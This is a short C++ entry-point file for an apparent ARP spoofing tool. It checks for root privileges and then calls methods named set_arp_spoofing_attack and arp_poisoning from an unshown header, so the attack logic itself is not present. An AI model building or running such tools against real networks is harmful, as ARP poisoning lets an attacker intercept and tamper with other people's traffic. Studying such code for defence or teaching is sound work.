#include "MyARPSpoofing.h"
#include <string>
#include <iostream>
#include <unistd.h>
#include <stdlib.h>

using namespace std;

int main(void)
{
	if(getuid())
	{
		cout << "Please Run It as Root" << endl;
		exit(1);
	}
	MyARPSpoofing MyARPSpoofingObject;

	MyARPSpoofingObject.set_arp_spoofing_attack();
	MyARPSpoofingObject.arp_poisoning();
}
